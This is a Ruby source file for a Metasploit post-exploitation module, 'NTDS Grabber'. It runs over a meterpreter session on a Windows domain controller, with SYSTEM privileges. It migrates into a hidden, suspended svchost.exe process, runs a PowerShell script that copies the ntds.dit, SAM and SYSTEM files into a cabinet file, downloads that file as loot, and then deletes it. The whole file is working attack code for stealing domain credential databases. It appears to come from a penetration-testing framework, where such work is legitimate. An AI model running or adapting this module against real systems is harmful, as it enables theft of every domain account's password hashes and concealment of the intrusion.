require 'msf/core'

class MetasploitModule < Msf::Post
    include Msf::Post::Windows::Powershell
    include Msf::Post::Windows::Priv
    include Msf::Post::Windows::Registry
    include Msf::Post::File
    include Msf::Post::Common

    def initialize(info={})
        super(update_info(info,
          'Name'          => 'NTDS Grabber',
          'Description'   => %q{This module uses a powershell script to obtain a copy of the ntds.dit, SAM and SYSTEM files on a domain controller. It puts all these files in a .cab file called All.cab in the current working directory.},
          'License'       => MSF_LICENSE,
          'Author'        => ['Koen Riepe (koen.riepe@fox-it.com)'],
          'References'    => [''],
          'Platform'      => [ 'win' ],
          'Arch'          => [ 'x86', 'x64' ],
          'SessionTypes'  => [ 'meterpreter' ]
        ))

    register_options(
    [
      OptBool.new('DOWNLOAD', [ true, 'Immediately download the All.cab file', true ]),
      OptBool.new('CLEANUP', [ true, 'Remove the All.cab file at the end of module execution', true ])
    ], self.class)
    end

    def is_dc()
    is_dc_srv = false
    serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
        if registry_enumkeys(serviceskey).include?("NTDS")
            if registry_enumkeys(serviceskey + "\\NTDS").include?("Parameters")
                is_dc_srv = true
            end
        end
        return is_dc_srv
    end

    def taskRunning(task)
        session.shell_write("tasklist \n")
        tasklist = session.shell_read(-1,10).split("\n")
        tasklist.each do |prog|
            if prog.include? task
                session.shell_close()
                return true
            end
        end
        return false
    end

    def Is32BitOn64Bits()
        apicall = session.railgun.kernel32.IsWow64Process(-1,4)["Wow64Process"]
        if apicall == "\x00\x00\x00\x00"
            migrate = false
        else
            migrate = true
        end
        return migrate
    end

    def GetWindowsLoc()
        apicall = session.railgun.kernel32.GetEnvironmentVariableA("Windir",255,255)["lpBuffer"]
        windir = apicall.split(":")[0]
        return windir
    end

    def run
        downloadflag = datastore['DOWNLOAD']
        cleanupflag = datastore['CLEANUP']

        if is_system?
            print_good("Running as SYSTEM")
        else
            print_error("Not running as SYSTEM, you need to be system to run this module! STOPPING")
            return
        end

        if not is_dc()
            print_error("Not running on a domain controller, you need run this module on a domain controller! STOPPING")
            return
        else
            print_good("Running on a domain controller")
        end

        if have_powershell?
            print_good("PowerShell is installed.")
        else
            print_error("PowerShell is not installed! STOPPING")
            return
        end

        if Is32BitOn64Bits()
            print_error("The meterpreter is not the same architecture as the OS! Migrating to process matching architecture!")
            windir = GetWindowsLoc()
            newproc = windir + ':\windows\sysnative\svchost.exe'
            if exist?(newproc)
                print_status("Starting new x64 process #{newproc}")
                pid = session.sys.process.execute(newproc,nil,{'Hidden' => true,'Suspended' => true}).pid
                print_good("Got pid #{pid}")
                print_status("Migrating..")
                session.core.migrate(pid)
                if pid == session.sys.process.getpid
                    print_good("Success!")
                else
                    print_error("Migration failed!")
                end
            end
        else 
            print_good("The meterpreter is the same architecture as the OS!")
        end

        base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "NTDSgrab.ps1"))
        execute_script(base_script)
        print_status("Powershell Script executed")
        cabcount = 0

        while cabcount < 2
            if taskRunning("makecab.exe")
                cabcount += 1
                while cabcount < 2
                    print_status("Creating All.cab")
                    if not taskRunning("makecab.exe")
                        cabcount += 1
                        while not file_exist?("All.cab")
                            sleep(1)
                            print_status("Waiting for All.cab")
                        end
                        print_good("All.cab should be created in the current working directory")
                    end
                    sleep(1)
                end
            end
            sleep(1)
        end

        if downloadflag
            print_status("Downloading All.cab")
            p1 = store_loot("Cabinet File", "application/cab", session, read_file("All.cab"), "All.cab", "Cabinet file containing SAM, SYSTEM and NTDS.dit")
            print_good("All.cab saved in: #{p1.to_s}")
        end

        if cleanupflag
            print_status("Removing All.cab")
            file_rm('All.cab')
            print_good("All.cab Removed")
        end
    end
end